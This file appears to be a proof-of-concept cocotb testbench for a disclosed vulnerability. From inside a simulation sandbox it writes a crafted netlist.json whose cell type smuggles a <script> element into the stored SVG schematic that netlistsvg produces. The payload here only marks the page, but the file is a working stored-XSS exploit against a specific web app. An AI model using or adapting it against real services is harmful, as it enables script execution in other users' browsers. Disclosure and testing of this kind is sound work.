# PoC for the SVG-XSS finding: overwrites the job's netlist.json from inside the
# sandbox. The worker reads netlist.json after the run (dockerRunner.js) and passes
# it to prepareNetlist(); netlistsvg 1.0.2 serialized cell types without XML
# escaping, so the cell type below becomes a real <script> element in the stored
# SVG artifact. The script only fires if a user opens the schematic's Blob URL as
# a document (useSimArtifacts.js creates it via URL.createObjectURL) — the <img>
# preview stays inert.
#
# Upload as the testbench (.py) of a simulation with netlist generation enabled.
# Any trivial DUT works; the test itself just passes so the job succeeds.

import json
import os

import cocotb

# Runs only in a top-level SVG document context; leaves an unmissable marker.
MARKER = (
    "document.title='XSS-EXECUTED';"
    "var m=document.createElementNS('http://www.w3.org/2000/svg','text');"
    "m.setAttribute('x','10');m.setAttribute('y','25');"
    "m.setAttribute('style','font-size:20px;fill:red');"
    "m.textContent='XSS EXECUTED in origin '+location.origin;"
    "document.documentElement.appendChild(m);"
)

PAYLOAD_CELL_TYPE = f"</text><script>{MARKER}</script><text>"

# Minimal valid Yosys JSON: one top module, one gate whose type is the payload.
MALICIOUS_NETLIST = {
    "modules": {
        "main": {
            "attributes": {"top": 1},
            "ports": {
                "a": {"direction": "input", "bits": [2]},
                "y": {"direction": "output", "bits": [3]},
            },
            "cells": {
                "u": {
                    "type": PAYLOAD_CELL_TYPE,
                    "parameters": {},
                    "port_directions": {"A": "input", "Y": "output"},
                    "connections": {"A": [2], "Y": [3]},
                },
            },
            "netnames": {},
        },
    },
}


@cocotb.test()
async def plant_malicious_netlist(dut):
    # cwd of the sandbox container is the job directory (sandbox.js: docker -w),
    # which is exactly where the worker looks for netlist.json afterwards.
    target = os.path.join(os.getcwd(), "netlist.json")
    with open(target, "w") as fh:
        json.dump(MALICIOUS_NETLIST, fh)
    dut._log.info(f"PoC: wrote malicious netlist to {target}")
    # Returning normally keeps the job green so the artifact is produced.
